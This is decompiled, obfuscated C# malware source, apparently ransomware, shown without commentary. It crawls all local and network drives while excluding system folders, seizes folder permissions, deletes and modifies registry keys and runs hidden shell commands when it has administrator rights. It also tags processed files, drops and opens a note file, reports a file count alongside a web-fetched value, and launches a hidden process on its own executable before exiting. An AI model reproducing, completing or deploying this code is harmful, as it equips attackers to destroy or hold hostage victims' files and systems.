				if (RPyXoPlOJmdYqIY == getString_0(107397066))
				{
					vnvqegDZgMFTThUQ.rpAwBKAwCZdJca(getString_0(107391985), getString_0(107391980), getString_0(107391935), string.Concat(JqDJfBiOyDaAy(getString_0(107396311)), new WebClient().DownloadString(JqDJfBiOyDaAy(getString_0(107396286))), getString_0(107391926), JqDJfBiOyDaAy(getString_0(107396272)), DateTime.Now, getString_0(107396245), JqDJfBiOyDaAy(getString_0(107391953)), Convert.ToString(oODUpNadLmFxS.Count), getString_0(107396245), JqDJfBiOyDaAy(getString_0(107396231)), OakwZVTgeU));
				}
				else
				{
					vnvqegDZgMFTThUQ.rpAwBKAwCZdJca(getString_0(107391985), getString_0(107391980), getString_0(107391935), string.Concat(JqDJfBiOyDaAy(getString_0(107396311)), new WebClient().DownloadString(JqDJfBiOyDaAy(getString_0(107396286))), getString_0(107391926), JqDJfBiOyDaAy(getString_0(107396272)), DateTime.Now, getString_0(107396245), JqDJfBiOyDaAy(getString_0(107391953)), Convert.ToString(oODUpNadLmFxS.Count), getString_0(107396245), JqDJfBiOyDaAy(getString_0(107396231)), OakwZVTgeU));
				}
			}
			catch
			{
			}
		}
		if (FVhIETATHxQtua == getString_0(107396809))
		{
			try
			{
				pOEsuxrkOZjJvZLO.fOjvFFytLpj(new Uri(getString_0(107391872)));
			}
			catch
			{
			}
		}
		if (lYjneyxwbcYdtGcJ == getString_0(107397066))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394449)))
				{
					Process.Start(JqDJfBiOyDaAy(getString_0(107391871)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394449));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107391646)))
				{
					Process.Start(JqDJfBiOyDaAy(getString_0(107391878)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107391646));
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(JkMlKoPfgeJRaLaUZ))
		{
			try
			{
				File.Delete(JkMlKoPfgeJRaLaUZ);
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397174))))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397174)));
			}
		}
		catch (Exception ex14)
		{
			try
			{
				File.AppendAllText(nPLbuhisBzmHoeaY, getString_0(107391317) + ex14.Message);
			}
			catch (Exception)
			{
			}
		}
		if (rcFXGcWApOJB)
		{
			try
			{
				File.AppendAllText(nPLbuhisBzmHoeaY, getString_0(107391304));
			}
			catch (Exception)
			{
			}
		}
		if (nadKcguuEob == getString_0(107391259))
		{
			bblGGLeySpj();
		}
	}

	public static void gwqpbDhvTaQ()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(JqDJfBiOyDaAy(getString_0(107391250)), JqDJfBiOyDaAy(getString_0(107391096)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int CULulWVeCQQILTquo(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> fTXPaDIdVpG(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107391579)) && !text.Contains(getString_0(107391586)) && !text.Contains(getString_0(107391521)) && !text.ToLower().Contains(getString_0(107391536)) && !text.ToLower().Contains(getString_0(107391523)) && !text.Contains(getString_0(107391498)) && !text.Contains(getString_0(107391445)) && !text.ToLower().Contains(getString_0(107391464)) && !text.ToLower().Contains(getString_0(107391419)) && !text.ToLower().Contains(getString_0(107391382)) && !text.ToLower().Contains(getString_0(107391405)) && !text.ToLower().Contains(getString_0(107391356)) && !text.ToLower().Contains(getString_0(107391375)) && !text.ToLower().Contains(getString_0(107391362)) && !text.ToLower().Contains(getString_0(107390829)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107390772)) && !fileInfo.FullName.Contains(getString_0(107390787)) && !fileInfo.FullName.Contains(getString_0(107390738)) && !fileInfo.FullName.Contains(getString_0(107390721)) && !fileInfo.FullName.Contains(getString_0(107390736)) && !fileInfo.FullName.Contains(getString_0(107390687)) && !fileInfo.FullName.Contains(getString_0(107390702)) && !fileInfo.FullName.Contains(getString_0(107390653)) && !fileInfo.FullName.Contains(getString_0(107390672)) && !fileInfo.FullName.Contains(getString_0(107390619)) && !fileInfo.FullName.ToLower().Contains(getString_0(107390638)) && !fileInfo.FullName.ToLower().Contains(getString_0(107390593)) && !fileInfo.FullName.ToLower().Contains(getString_0(107390608)) && !fileInfo.FullName.ToLower().Contains(getString_0(107391071)) && !fileInfo.FullName.Contains(JqDJfBiOyDaAy(getString_0(107391086))) && !fileInfo.FullName.Contains(getString_0(107391029)) && !fileInfo.FullName.Contains(getString_0(107397174)) && !fileInfo.FullName.Contains(getString_0(107391048)) && !fileInfo.FullName.EndsWith(getString_0(107394483)) && !fileInfo.FullName.EndsWith(getString_0(107395138)) && !fileInfo.FullName.EndsWith(getString_0(107390999)) && !fileInfo.FullName.EndsWith(getString_0(107395101)) && !fileInfo.FullName.EndsWith(getString_0(107390994)) && !fileInfo.FullName.Contains(getString_0(107391021)) && !fileInfo.FullName.Contains(pcdcyuTjjngA) && !fileInfo.FullName.Contains(nPLbuhisBzmHoeaY) && !fileInfo.FullName.Contains(ZvuGPiZgTVaL))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(GZecQutuAYrd) * 1024.0 * 1024.0 && buxEOyFbGjfNzeAW == getString_0(107396809))
						{
							list.Add(fileInfo.FullName);
							eUdjecBKcnd(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && buxEOyFbGjfNzeAW == getString_0(107397066))
						{
							list.Add(fileInfo.FullName);
							eUdjecBKcnd(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void wQJZbnWkxQVjKWEO()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107390972));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!FYgeyItMBgHKLJgZ.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107390951), getString_0(107397179)).Replace(getString_0(107390946), getString_0(107390951))
					.Replace(getString_0(107390905), getString_0(107391872))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					FYgeyItMBgHKLJgZ.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107390951), getString_0(107397179)).Replace(getString_0(107390946), getString_0(107390951))
						.Replace(getString_0(107390905), getString_0(107391872))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107390900), getString_0(107391872)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string xxpegTfogDffK(string iLdUstSjetXg = "", string VKAzrUulKFP = "")
	{
		string result = getString_0(107391872);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = iLdUstSjetXg,
				Arguments = VKAzrUulKFP,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void BsDrYOpMlrRdxB(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107390923),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string lOmjExCerIObT(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string JqDJfBiOyDaAy(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	private static void uKyLyocBMtsGX()
	{
		//IL_0257: Unknown result type (might be due to invalid IL or missing references)
		//IL_025e: Expected O, but got Unknown
		//IL_0280: Unknown result type (might be due to invalid IL or missing references)
		//IL_0287: Expected O, but got Unknown
		yBgFrSdripa();
		List<lhTRclngXGw> list = lhTRclngXGw.qIPvSVzzZkaQ();
		foreach (lhTRclngXGw item in list)
		{
			DIrAiHcqaZdYH.Add(item.IPAddress);
		}
		List<string> dIrAiHcqaZdYH = DIrAiHcqaZdYH;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate19 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate19 = delegate(string string_0)
			{
				dBfCHUgEGYG CS_0024_003C_003E8__locals0 = new dBfCHUgEGYG();
				CS_0024_003C_003E8__locals0.cCKscmLjgqEgN = string_0;
				if ((!CS_0024_003C_003E8__locals0.cCKscmLjgqEgN.StartsWith(getString_0(107388506)) && !CS_0024_003C_003E8__locals0.cCKscmLjgqEgN.StartsWith(getString_0(107388501)) && !CS_0024_003C_003E8__locals0.cCKscmLjgqEgN.StartsWith(getString_0(107388524)) && !CS_0024_003C_003E8__locals0.cCKscmLjgqEgN.StartsWith(getString_0(107391872))) || !pkcHoAftRnR.BNCnsqaGxavT(CS_0024_003C_003E8__locals0.cCKscmLjgqEgN))
				{
					return;
				}
				try
				{
					Thread.Sleep(LoqeOEkLpePTMECv);
					FYgeyItMBgHKLJgZ.Add(getString_0(107390951) + CS_0024_003C_003E8__locals0.cCKscmLjgqEgN + getString_0(107388479));
					try
					{
						if (DcTmJYuRqmJcpcY)
						{
							Console.WriteLine(getString_0(107390951) + CS_0024_003C_003E8__locals0.cCKscmLjgqEgN + getString_0(107388479));
						}
					}
					catch
					{
					}
					Parallel.For(68, 91, delegate(int int_0)
					{
						Thread.Sleep(LoqeOEkLpePTMECv);
						FYgeyItMBgHKLJgZ.Add(dBfCHUgEGYG.getString_0(107390957) + CS_0024_003C_003E8__locals0.cCKscmLjgqEgN + dBfCHUgEGYG.getString_0(107397185) + (char)int_0 + dBfCHUgEGYG.getString_0(107405487));
						try
						{
							if (DcTmJYuRqmJcpcY)
							{
								Console.WriteLine(dBfCHUgEGYG.getString_0(107390957) + CS_0024_003C_003E8__locals0.cCKscmLjgqEgN + dBfCHUgEGYG.getString_0(107397185) + (char)int_0 + dBfCHUgEGYG.getString_0(107405487));
							}
						}
						catch
						{
						}
					});
				}
				catch
				{
				}
			};
		}
		Parallel.ForEach(dIrAiHcqaZdYH, CS_0024_003C_003E9__CachedAnonymousMethodDelegate19);
		try
		{
			pkcHoAftRnR.TdilPuNISOjjseev tdilPuNISOjjseev = new pkcHoAftRnR.TdilPuNISOjjseev(pkcHoAftRnR.KYGuWVnUTxQGQ.CXmXPwCeKmZe, pkcHoAftRnR.ITLCMxkuvuSvCa.eiMDkWOEjfzpZ, pkcHoAftRnR.jKqxxrdUdUsWmkTz.XaBCllFBKoC, pkcHoAftRnR.TleAxVqOHvt.WrFiIlhQWEB);
			foreach (string item2 in tdilPuNISOjjseev)
			{
				MatchCollection matchCollection = Regex.Matches(item2, getString_0(107390874));
				foreach (Match item3 in matchCollection)
				{
					try
					{
						if (!FYgeyItMBgHKLJgZ.Contains(item3.ToString()))
						{
							FYgeyItMBgHKLJgZ.Add(item3.ToString());
						}
					}
					catch
					{
					}
					try
					{
						if (DcTmJYuRqmJcpcY)
						{
							Console.WriteLine(item3.ToString());
						}
					}
					catch
					{
					}
				}
			}
		}
		catch (Exception)
		{
		}
		mxUamsFWczRaf.pLiSneVfdnlz();
		try
		{
			if (DcTmJYuRqmJcpcY)
			{
				Console.WriteLine(getString_0(107390313));
			}
		}
		catch
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string string_ = lOmjExCerIObT(getString_0(107390240));
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(JqDJfBiOyDaAy(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(JqDJfBiOyDaAy(getString_0(107390135)), 1, RegistryValueKind.DWord);
					registryKey.SetValue(JqDJfBiOyDaAy(getString_0(107390078)), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (KirPMvFSpPtxq == getString_0(107396809))
		{
			LJNybARDNBq.RydTkWjufdM();
		}
		try
		{
			if (DcTmJYuRqmJcpcY)
			{
				Console.WriteLine(getString_0(107390577));
			}
		}
		catch
		{
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107390972));
		ManagementObjectEnumerator enumerator4 = val.Get().GetEnumerator();
		try
		{
			while (enumerator4.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator4.get_Current();
				if (FYgeyItMBgHKLJgZ.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107390951), getString_0(107397179)).Replace(getString_0(107390946), getString_0(107390951))
					.Replace(getString_0(107390905), getString_0(107391872))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					continue;
				}
				try
				{
					if (DcTmJYuRqmJcpcY)
					{
						Console.WriteLine(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107390951), getString_0(107397179)).Replace(getString_0(107390946), getString_0(107390951))
							.Replace(getString_0(107390905), getString_0(107391872))
							.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107390900), getString_0(107391872)));
					}
				}
				catch
				{
				}
				FYgeyItMBgHKLJgZ.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107390951), getString_0(107397179)).Replace(getString_0(107390946), getString_0(107390951))
					.Replace(getString_0(107390905), getString_0(107391872))
					.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107390900), getString_0(107391872)));
			}
		}
		finally
		{
			((IDisposable)enumerator4)?.Dispose();
		}
		try
		{
			if (DcTmJYuRqmJcpcY)
			{
				Console.WriteLine(getString_0(107390488));
			}
		}
		catch
		{
		}
	}

	public static void ZRImcljqIISuaY(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = JqDJfBiOyDaAy(getString_0(107390419));
		processStartInfo.Arguments = getString_0(107390390) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool yiFezsWeGjitO(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static void egMhAMendwXb()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = lOmjExCerIObT(getString_0(107390417));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(JqDJfBiOyDaAy(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(JqDJfBiOyDaAy(getString_0(107389767)));
					registryKey.DeleteSubKey(JqDJfBiOyDaAy(getString_0(107389742)));
					registryKey.DeleteSubKey(JqDJfBiOyDaAy(getString_0(107389693)));
					registryKey.DeleteSubKey(JqDJfBiOyDaAy(getString_0(107389700)));
					registryKey.DeleteSubKey(JqDJfBiOyDaAy(getString_0(107390419)));
					registryKey.DeleteSubKey(JqDJfBiOyDaAy(getString_0(107389675)));
					registryKey.DeleteSubKey(JqDJfBiOyDaAy(getString_0(107389646)));
					registryKey.Close();
				}
				string_ = lOmjExCerIObT(getString_0(107389597));
				registryKey = Registry.LocalMachine.OpenSubKey(JqDJfBiOyDaAy(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(JqDJfBiOyDaAy(getString_0(107390012)));
					registryKey.Close();
				}
				string_ = lOmjExCerIObT(getString_0(107390027));
				registryKey = Registry.LocalMachine.OpenSubKey(JqDJfBiOyDaAy(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(JqDJfBiOyDaAy(getString_0(107390012)));
					registryKey.Close();
				}
				string_ = lOmjExCerIObT(getString_0(107390027));
				registryKey = Registry.CurrentUser.OpenSubKey(JqDJfBiOyDaAy(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(JqDJfBiOyDaAy(getString_0(107390012)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			xxpegTfogDffK(JqDJfBiOyDaAy(getString_0(107389978)), JqDJfBiOyDaAy(getString_0(107389993)));
			xxpegTfogDffK(JqDJfBiOyDaAy(getString_0(107389912)), JqDJfBiOyDaAy(lOmjExCerIObT(getString_0(107389935))));
			xxpegTfogDffK(JqDJfBiOyDaAy(getString_0(107389912)), JqDJfBiOyDaAy(getString_0(107389245)));
			xxpegTfogDffK(JqDJfBiOyDaAy(getString_0(107389184)), JqDJfBiOyDaAy(getString_0(107389199)));
		}
		catch
		{
		}
	}

	public static void mHyPlqBfINJNrTmd(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(JqDJfBiOyDaAy(getString_0(107389126)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void VnNIJhBAQfWBV()
	{
		string string_ = lOmjExCerIObT(getString_0(107389101));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(JqDJfBiOyDaAy(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(JqDJfBiOyDaAy(getString_0(107389500)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void yBgFrSdripa()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			xxpegTfogDffK(JqDJfBiOyDaAy(getString_0(107389467)), JqDJfBiOyDaAy(getString_0(107389486)));
			xxpegTfogDffK(JqDJfBiOyDaAy(getString_0(107389467)), JqDJfBiOyDaAy(getString_0(107389356)));
		}
	}

	[DllImport("mpr.dll")]
	private static extern int WNetGetUniversalNameA(string string_0, int int_0, IntPtr intptr_0, ref int int_1);

	private static string mONazSVbyAqapu(string uHmKpmrxOsRR, int KSgcgDLaYxWULcs = 2000)
	{
		IntPtr intPtr;
		try
		{
			intPtr = Marshal.AllocHGlobal(KSgcgDLaYxWULcs);
		}
		catch (OutOfMemoryException)
		{
			return null;
		}
		try
		{
			if (WNetGetUniversalNameA(uHmKpmrxOsRR, 1, intPtr, ref KSgcgDLaYxWULcs) != 0)
			{
				return null;
			}
			return Marshal.PtrToStringAnsi(Marshal.ReadIntPtr(intPtr));
		}
		catch (Exception)
		{
			return null;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	public static void bblGGLeySpj()
	{
		xxpegTfogDffK(getString_0(107396442), JqDJfBiOyDaAy(getString_0(107388666)));
		string text = JqDJfBiOyDaAy(getString_0(107388984));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107390905) + text + getString_0(107390905) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396442);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void qVCNNzzGmwuooDZ(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (rcFXGcWApOJB)
			{
				try
				{
					File.AppendAllText(nPLbuhisBzmHoeaY, getString_0(107388919) + string_0 + getString_0(107388942) + ex.Message + getString_0(107396245));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string UkwNvBJJCwFjgR()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107391872);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107388821);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107388876))) ? getString_0(107388826) : getString_0(107388867));
				break;
			case 0:
				text = getString_0(107388881);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107388848);
				break;
			case 4:
				text = getString_0(107388835);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107388817) : getString_0(107388794));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107388249) : getString_0(107388254)) : getString_0(107388803)) : getString_0(107388812));
				break;
			case 10:
				text = getString_0(107388244);
				break;
			}
		}
		if (text != getString_0(107391872))
		{
			text = getString_0(107388271) + text;
			if (oSVersion.ServicePack != getString_0(107391872))
			{
				text = text + getString_0(107388258) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string rSWVZLVcxxWN(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107394449);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(JqDJfBiOyDaAy(getString_0(107393880)));
				streamWriter.WriteLine(getString_0(107396245));
				streamWriter.WriteLine(JqDJfBiOyDaAy(getString_0(107391850)));
				streamWriter.WriteLine(string_0);
				if (oVVBsGsoBvRKjE)
				{
					streamWriter.WriteLine(getString_0(107396245));
					streamWriter.WriteLine(JqDJfBiOyDaAy(getString_0(107391708)));
					streamWriter.WriteLine(vnvqegDZgMFTThUQ.AEfbHcWBmhiPBNq());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !JweQHtvwAVLtP)
				{
					File.AppendAllText(text, getString_0(107391675) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (rcFXGcWApOJB)
			{
				try
				{
					File.AppendAllText(nPLbuhisBzmHoeaY, getString_0(107388221) + ex.Message + getString_0(107396245));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void zFCbExVZuZNx(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		ITCukbrtEbPW.rtHaJlKJsmfG CS_0024_003C_003E8__locals0 = new ITCukbrtEbPW();
		CS_0024_003C_003E8__locals0.sDVewQFEqEIbCRF = string_1;
		CS_0024_003C_003E8__locals0.fkLrKwgxXLk = string_2;
		CS_0024_003C_003E8__locals0.ZnHFVonNCbqP = string_3;
		CS_0024_003C_003E8__locals0.WOCeXDEuwOyQFVj = string_4;
		jBAOFpxRKVADf = Convert.FromBase64String(CS_0024_003C_003E8__locals0.ZnHFVonNCbqP);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107396525))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (!array[i].IsReady || array[i].DriveType == DriveType.CDRom)
					{
						continue;
					}
					if (array[i].DriveType == DriveType.Network)
					{
						try
						{
							string text = mONazSVbyAqapu(array[i].Name);
							if (!string.IsNullOrEmpty(text) && !FYgeyItMBgHKLJgZ.Contains(text))
							{
								FYgeyItMBgHKLJgZ.Add(text);
							}
							else if (!FYgeyItMBgHKLJgZ.Contains(array[i].Name))
							{
								FYgeyItMBgHKLJgZ.Add(array[i].Name);
							}
						}
						catch (Exception)
						{
							if (!FYgeyItMBgHKLJgZ.Contains(array[i].Name))
							{
								FYgeyItMBgHKLJgZ.Add(array[i].Name);
							}
						}
					}
					else if (!FYgeyItMBgHKLJgZ.Contains(array[i].Name))
					{
						FYgeyItMBgHKLJgZ.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!FYgeyItMBgHKLJgZ.Contains(string_0[j]))
				{
					FYgeyItMBgHKLJgZ.Add(string_0[j]);
				}
			}
		}
		if (FYgeyItMBgHKLJgZ.Contains(JqDJfBiOyDaAy(getString_0(107388196))) && iKXZxNSoHO == getString_0(107396809))
		{
			FYgeyItMBgHKLJgZ.Remove(JqDJfBiOyDaAy(getString_0(107388196)));
		}
		Parallel.ForEach(FYgeyItMBgHKLJgZ, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new ITCukbrtEbPW.rtHaJlKJsmfG();
			CS_0024_003C_003E8__locals0.SDPTJeBjOOW = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.siDSXstNNrM = string_0;
			if (luDuQnkIvNDbdd && !UkwNvBJJCwFjgR().Contains(ITCukbrtEbPW.getString_0(107388828)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						yiFezsWeGjitO(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.siDSXstNNrM);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (RPyXoPlOJmdYqIY == ITCukbrtEbPW.getString_0(107396820))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					cTSPHdoergifAD(CS_0024_003C_003E8__locals0.siDSXstNNrM, CS_0024_003C_003E8__locals0.SDPTJeBjOOW.sDVewQFEqEIbCRF, CS_0024_003C_003E8__locals0.SDPTJeBjOOW.WOCeXDEuwOyQFVj, CS_0024_003C_003E8__locals0.SDPTJeBjOOW.fkLrKwgxXLk, CS_0024_003C_003E8__locals0.SDPTJeBjOOW.ZnHFVonNCbqP);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				cTSPHdoergifAD(CS_0024_003C_003E8__locals0.siDSXstNNrM, CS_0024_003C_003E8__locals0.sDVewQFEqEIbCRF, CS_0024_003C_003E8__locals0.WOCeXDEuwOyQFVj, CS_0024_003C_003E8__locals0.fkLrKwgxXLk, CS_0024_003C_003E8__locals0.ZnHFVonNCbqP);
			}
		});
	}

	public static void cTSPHdoergifAD(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107391872));
		List<string> list3 = list2;
		if (LKbgowDgmg == getString_0(107397066))
		{
			list = fTXPaDIdVpG(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = OYORDAJGVWu.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_039b;
					}
				}
				if ((ToPvNEVWQmmpbo == getString_0(107397066) && !item.EndsWith(text)) || oODUpNadLmFxS.Contains(item))
				{
					continue;
				}
				if (xziKmMkpqKW == getString_0(107396809))
				{
					try
					{
						if (OVAWlGSBxtgO.eWzXoGEEKK(item))
						{
							OVAWlGSBxtgO.lbpBdeyOdYV(item);
						}
					}
					catch
					{
